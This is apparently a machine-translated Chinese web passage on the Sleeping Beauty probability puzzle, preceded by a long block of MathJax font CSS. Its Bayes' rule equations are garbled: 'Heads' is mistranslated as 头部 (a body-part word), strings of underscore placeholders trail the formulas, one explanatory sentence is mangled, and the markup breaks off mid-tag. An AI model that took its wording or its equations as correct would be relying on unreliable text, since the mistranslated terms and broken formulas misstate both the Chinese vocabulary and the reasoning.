@font-face {font-family: MJXc-TeX-cal-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Caligraphic-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Caligraphic-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Caligraphic-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-main-B; src: local('MathJax_Main Bold'), local('MathJax_Main-Bold')}
@font-face {font-family: MJXc-TeX-main-Bx; src: local('MathJax_Main'); font-weight: bold}
@font-face {font-family: MJXc-TeX-main-Bw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Main-Bold.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Main-Bold.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Main-Bold.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-main-I; src: local('MathJax_Main Italic'), local('MathJax_Main-Italic')}
@font-face {font-family: MJXc-TeX-main-Ix; src: local('MathJax_Main'); font-style: italic}
@font-face {font-family: MJXc-TeX-main-Iw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Main-Italic.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Main-Italic.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Main-Italic.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-main-R; src: local('MathJax_Main'), local('MathJax_Main-Regular')}
@font-face {font-family: MJXc-TeX-main-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Main-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Main-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Main-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-math-I; src: local('MathJax_Math Italic'), local('MathJax_Math-Italic')}
@font-face {font-family: MJXc-TeX-math-Ix; src: local('MathJax_Math'); font-style: italic}
@font-face {font-family: MJXc-TeX-math-Iw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Math-Italic.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Math-Italic.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Math-Italic.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-size1-R; src: local('MathJax_Size1'), local('MathJax_Size1-Regular')}
@font-face {font-family: MJXc-TeX-size1-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Size1-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Size1-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Size1-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-size2-R; src: local('MathJax_Size2'), local('MathJax_Size2-Regular')}
@font-face {font-family: MJXc-TeX-size2-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Size2-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Size2-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Size2-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-size3-R; src: local('MathJax_Size3'), local('MathJax_Size3-Regular')}
@font-face {font-family: MJXc-TeX-size3-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Size3-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Size3-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Size3-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-size4-R; src: local('MathJax_Size4'), local('MathJax_Size4-Regular')}
@font-face {font-family: MJXc-TeX-size4-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Size4-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Size4-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Size4-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-vec-R; src: local('MathJax_Vector'), local('MathJax_Vector-Regular')}
@font-face {font-family: MJXc-TeX-vec-Rw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Vector-Regular.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Vector-Regular.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Vector-Regular.otf') format('opentype')}
@font-face {font-family: MJXc-TeX-vec-B; src: local('MathJax_Vector Bold'), local('MathJax_Vector-Bold')}
@font-face {font-family: MJXc-TeX-vec-Bx; src: local('MathJax_Vector'); font-weight: bold}
@font-face {font-family: MJXc-TeX-vec-Bw; src /*1*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/eot/MathJax_Vector-Bold.eot'); src /*2*/: url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/woff/MathJax_Vector-Bold.woff') format('woff'), url('https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/fonts/HTML-CSS/TeX/otf/MathJax_Vector-Bold.otf') format('opentype')}
</style></p><p>另一方面，如果它肯定是 1 号房间，那么它不可能是空的，因此没有观察到新的证据。</p><p> <span><span class="mjpage"><span class="mjx-chtml"><span class="mjx-math" aria-label="P(Heads|Room1) = P(Room1|Heads)P(Heads)/P(Room1) = 1/2"><span class="mjx-mrow" aria-hidden="true"><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.109em;">P</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.057em;">头部</span></span><span class="mjx-texatom"><span class="mjx-mrow"><span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">|</span></span></span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">房间</span></span><span class="mjx-mn"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.372em; padding-bottom: 0.372em;">1</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo MJXc-space3"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.077em; padding-bottom: 0.298em;">=</span></span> <span class="mjx-mi MJXc-space3"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.109em;">P</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">房间</span></span><span class="mjx-mn"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.372em; padding-bottom: 0.372em;">1</span></span> <span class="mjx-texatom"><span class="mjx-mrow"><span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">|</span></span></span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.057em;">头部</span></span><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">)</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.003em;">P</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.003em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">头部</span></span><span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">/</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">P</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">房间</span></span><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">1</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">)</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">=</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">1</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">/</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">2</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.109em;">_</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.057em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.003em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">_</span></span> <span class="mjx-texatom"><span class="mjx-mrow"><span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">_</span></span></span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.109em;">_</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mn"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.372em; padding-bottom: 0.372em;">_</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">_</span></span> <span class="mjx-mo MJXc-space3"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.077em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mn MJXc-space3"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.372em; padding-bottom: 0.372em;">_</span></span> <span class="mjx-texatom"><span class="mjx-mrow"><span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">_</span></span></span></span> <span class="mjx-mn"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.372em; padding-bottom: 0.372em;">_</span></span></span></span></span></span></span></p><p>但正如我们所知，对于美女本人来说，情况却截然不同。她的存在并没有给她任何新的信息，因为她的行为没有随机抽样</p><p><span><span class="mjpage"><span class="mjx-chtml"><span class="mjx-math" aria-label="P(Heads|Existence) = P(Existence|Heads)P(Heads)/P(Existence) = 1/2"><span class="mjx-mrow" aria-hidden="true"><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.109em;">P</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.057em;">头部</span></span><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">|</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">存在</span></span><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">)</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">=</span></span> <span class="mjx-mi MJXc-space3"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.109em;">P</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">存在</span></span><span class="mjx-mo MJXc-space3"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.077em; padding-bottom: 0.298em;">|</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">头部</span></span><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.026em;">)</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">P</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">头部</span></span><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.026em;">)</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">/</span></span> <span class="mjx-texatom"><span class="mjx-mrow"><span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">P</span></span></span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.003em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">E</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">x</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-texatom"><span class="mjx-mrow"><span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">_</span></span></span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.057em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.003em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.109em;">_</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.057em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.003em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">_</span></span> <span class="mjx-texatom"><span class="mjx-mrow"><span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">_</span></span></span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.109em;">_</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.026em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">强度</span></span><span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mo MJXc-space3"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.077em; padding-bottom: 0.298em;">=</span></span> <span class="mjx-mn MJXc-space3"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.372em; padding-bottom: 0.372em;">1</span></span> <span class="mjx-texatom"><span class="mjx-mrow"><span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">/</span></span></span></span> <span class="mjx-mn"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.372em; padding-bottom: 0.372em;">2</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.372em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span></span></span></span></span></span></p><p>但当硬币正面朝上时，进入 1 号房间的可能性是正面的两倍</p><p><span><span class="mjpage"><span class="mjx-chtml"><span class="mjx-math" aria-label="P(Heads|Room1) = P(Room1|Heads)P(Heads)/P(Room1) = 2/3"><span class="mjx-mrow" aria-hidden="true"><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.109em;">P</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.057em;">头部</span></span><span class="mjx-texatom"><span class="mjx-mrow"><span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">|</span></span></span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">房间</span></span><span class="mjx-mn"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.372em; padding-bottom: 0.372em;">1</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">)</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">=</span></span> <span class="mjx-mi MJXc-space3"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.109em;">P</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">房间</span></span><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">1</span></span> <span class="mjx-texatom"><span class="mjx-mrow"><span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">|</span></span></span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.057em;">头部</span></span><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.003em;">)</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">P</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">(</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">头部</span></span><span class="mjx-mo MJXc-space3"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.077em; padding-bottom: 0.298em;">)</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">/</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">P</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">(</span></span> <span class="mjx-mn"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.372em; padding-bottom: 0.372em;">房间</span></span><span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">1</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">)</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.003em;">=</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">2</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">/</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">3</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.109em;">_</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.057em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.003em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.225em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">_</span></span> <span class="mjx-texatom"><span class="mjx-mrow"><span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">_</span></span></span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em; padding-right: 0.109em;">_</span></span> <span class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.446em; padding-bottom: 0.593em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.446em; padding-bottom: 0.298em;">_</span></span> <span class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" 